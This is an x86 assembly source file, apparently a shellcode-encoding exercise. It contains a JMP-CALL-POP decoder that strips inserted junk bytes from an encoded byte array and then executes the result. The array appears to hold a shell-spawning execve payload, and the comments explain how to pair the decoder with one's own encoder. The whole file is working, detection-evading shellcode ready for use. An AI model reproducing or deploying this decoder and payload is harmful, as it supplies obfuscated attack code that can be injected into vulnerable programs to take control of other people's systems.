
global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi							; the address of EncodedShellcode
	lea edi, [esi +1]				; edi is the cursor of the decoded shellcode
	xor eax, eax					; some small initialization
	xor ebx, ebx
	xor ecx, ecx

decode: 							; it's a while loop

	add al, byte [esi + eax + 1]	; we add the value that's after the shellcode byte, so to skip that number of bytes to the next needed byte
	adc ah, ch						; adding over 8-bit (256 encoded shellcode)
	mov bl, byte [esi + eax + 2]	; get the needed byte (we add 2 to include the next position + the byte that gives the number of random bytes)
	
	cmp bl, 0x04					; if the byte is CTRL + D aka 4 in ASCII !!!CHANGE THIS WITH THE END CHAR FROM YOUR ENCODER
	jne short not_the_end			; if not, go on and decode, otherwise
	cmp byte [esi + eax + 3], 0x04	; our next immediate byte is still 4?
	je 	EncodedShellcode			; we got our shellcode, now run
									
not_the_end:
	mov byte [edi], bl				; we put it where the decoded shellcode cursor points

	inc edi							; increment the decoded shellcode cursor
	add al,2						; add 2 to al, even after we added above, to skip the byte that gives the number of trash bytes + 1 to position ourselves on the next good byte
	adc ah, ch						; adding over 8-bit (256 encoded shellcode)
	
	jmp short decode				; and give it another round

call_shellcode:

	call decoder
	EncodedShellcode: db 0x31,0x08,0x33,0x2e,0x2f,0x3b,0x3f,0x47,0x4b,0x78,0xc0,0x05,0x30,0x49,0x78,0x52,0x61,0x50,0x06,0x3f,0x51,0x33,0x46,0x22,0x6b,0x68,0x08,0x3f,0x21,0x78,0x3d,0x54,0x53,0x7b,0x48,0x2f,0x05,0x52,0x6f,0x28,0x23,0x2c,0x2f,0x04,0x28,0x74,0x37,0x3b,0x73,0x06,0x6a,0x59,0x67,0x5b,0x58,0x2b,0x68,0x0a,0x75,0x2b,0x2e,0x63,0x4a,0x22,0x5c,0x7b,0x7a,0x55,0x68,0x0a,0x45,0x73,0x39,0x64,0x50,0x26,0x54,0x65,0x46,0x7a,0x2f,0x05,0x61,0x3f,0x5c,0x3c,0x48,0x62,0x02,0x74,0x75,0x69,0x08,0x3c,0x74,0x26,0x49,0x6c,0x38,0x5e,0x43,0x6e,0x05,0x6b,0x37,0x6f,0x79,0x4a,0x89,0x06,0x2a,0x4f,0x5f,0x24,0x27,0x30,0xe3,0x07,0x44,0x42,0x71,0x72,0x4c,0x67,0x49,0x50,0x04,0x3d,0x24,0x69,0x60,0x89,0x02,0x3b,0x21,0xe2,0x0a,0x6d,0x50,0x2c,0x3b,0x41,0x46,0x24,0x4d,0x6b,0x7d,0x53,0x02,0x31,0x72,0x89,0x04,0x79,0x43,0x55,0x3e,0xe1,0x07,0x3a,0x5c,0x36,0x50,0x74,0x34,0x37,0xb0,0x03,0x39,0x3d,0x3c,0x0b,0x03,0x2c,0x79,0x6a,0xcd,0x04,0x39,0x2b,0x3d,0x64,0x80,0x09,0x52,0x2b,0x6f,0x23,0x3a,0x30,0x51,0x53,0x74,0x04,0x04






